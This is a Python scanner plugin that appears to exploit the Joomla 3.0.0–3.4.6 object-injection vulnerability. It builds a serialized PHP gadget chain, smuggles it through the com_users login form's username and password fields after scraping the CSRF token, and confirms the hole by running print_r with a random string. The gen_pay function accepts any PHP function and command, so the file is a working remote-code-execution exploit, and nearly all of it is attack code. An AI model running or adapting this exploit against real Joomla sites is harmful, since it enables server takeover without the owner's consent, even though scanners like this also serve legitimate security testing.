import requests
from bs4 import BeautifulSoup
import string
import random

from celery_app.utils.utils import insert_vuln_db
from celery_app.config.config import web_port_short

#Joomla 3.0.0~3.4.6 对象注入
plugin_id=62
default_port_list=web_port_short


def random_string(stringLength):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))


def get_token(url, cook):
    resp = requests.get(url, cookies=cook)
    html = BeautifulSoup(resp.text, 'html.parser')
    for v in html.find_all('input'):
        csrf = v
    csrf = csrf.get('name')
    return csrf


def get_cook(url):
    resp = requests.get(url)
    return resp.cookies


def gen_pay(function, command):
    template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
    payload = 'http://l/;' + command
    final = template.replace('PAYLOAD', payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME',
                                                                                              function).replace(
        'FUNC_LEN', str(len(function)))
    return final


def make_req(url, object_payload):
    cook = get_cook(url)
    csrf = get_token(url, cook)

    user_payload = '\\0\\0\\0' * 9
    padding = 'AAA'
    inj_object = '";'
    inj_object += object_payload
    inj_object += 's:6:"return";s:102:'
    password_payload = padding + inj_object
    params = {
        'username': user_payload,
        'password': password_payload,
        'option': 'com_users',
        'task': 'user.login',
        csrf: '1'
    }
    requests.packages.urllib3.disable_warnings()
    resp = requests.post(url, cookies=cook, data=params)
    return resp.text


def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    url = '{}/index.php/component/users'.format(target)
    check_string = random_string(20)
    hit = check_string

    try:

        response = make_req(url, gen_pay('print_r', check_string))
        if hit in response:
            output = '验证字符串: {}\n请求响应: {}'.format(hit,response)
            insert_vuln_db(host, target, output, plugin_id)
            return True, host, target, output
    except Exception as error:
        return False
    return False

